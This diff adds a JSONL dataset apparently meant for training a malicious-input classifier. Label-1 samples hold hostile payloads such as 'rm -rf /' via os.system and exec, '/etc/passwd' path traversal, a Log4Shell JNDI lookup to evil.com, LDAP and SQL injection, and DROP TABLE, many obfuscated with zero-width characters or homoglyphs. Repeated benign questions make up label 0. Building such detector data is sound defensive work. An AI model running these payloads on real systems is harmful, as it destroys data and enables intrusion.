@@ -1,0 +1,204 @@
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "*)(uid%3D*))(|(uid%3D*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "​隐藏​字符​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "DROP\\x20\\x20TABLE\\x20\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Hello, how are you?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the weather today?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Can you help me with Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain quantum computing", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How do I sort a list in Python?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is machine learning?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Tell me about artificial intelligence", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "How does a neural network work?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "What is the capital of France?", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
+{"text": "Explain the difference between AI and ML", "label": 0, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.433653"}
